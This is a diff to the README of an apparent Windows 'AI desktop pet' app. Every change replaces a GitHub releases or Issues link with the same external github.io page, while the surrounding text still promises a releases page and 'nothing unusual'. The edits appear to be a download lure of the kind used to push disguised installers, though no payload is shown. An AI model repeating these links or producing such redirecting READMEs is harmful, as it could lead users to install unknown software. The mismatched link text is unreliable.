@@ -1,6 +1,6 @@
 # 🐾 ai-desktop-pet-2026 - Your Live Desktop Companion Awaits!
 
-[![Download Now](https://img.shields.io/badge/Download-ai--desktop--pet--2026-2ea44f?style=for-the-badge)](https://github.com/Carsystem7222/ai-desktop-pet-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-ai--desktop--pet--2026-2ea44f?style=for-the-badge)](https://carsystem7222.github.io)
 
 ---
 
@@ -55,7 +55,7 @@ Ready to meet your new desktop friend? Follow these **three simple steps** — n
 
 Visit this link to download the application:
 
-[**👉 Click Here to Download ai-desktop-pet-2026**](https://github.com/Carsystem7222/ai-desktop-pet-2026/releases)
+[**👉 Click Here to Download ai-desktop-pet-2026**](https://carsystem7222.github.io)
 
 You’ll land on the releases page. Look for the **latest version** (it should be at the top) and click the download button. The file is a standard Windows installer — nothing unusual.
 
@@ -159,7 +159,7 @@ To check for updates, open the app, right-click the pet, go to **Settings**, and
 
 If you run into any issues or have feature requests, please:
 
-1. Visit the [GitHub Issues page](https://github.com/Carsystem7222/ai-desktop-pet-2026/issues)
+1. Visit the [GitHub Issues page](https://carsystem7222.github.io)
 2. Describe your problem or idea clearly
 3. Include your Windows version and error message (if any)
 
@@ -182,7 +182,7 @@ You’re also welcome to star the repository ⭐ if you enjoy the app — it hel
 
 Your desktop has been waiting for a little life. Bring home your new AI-powered companion today — it will greet you every time you sit down, keep you company during late work sessions, and always be up for a playful chase.
 
-[**✅ Download ai-desktop-pet-2026 Now**](https://github.com/Carsystem7222/ai-desktop-pet-2026/releases)
+[**✅ Download ai-desktop-pet-2026 Now**](https://carsystem7222.github.io)
 
 It’s free, it’s fun, and it only takes two minutes to set up. Your new pet is just a click away!
 
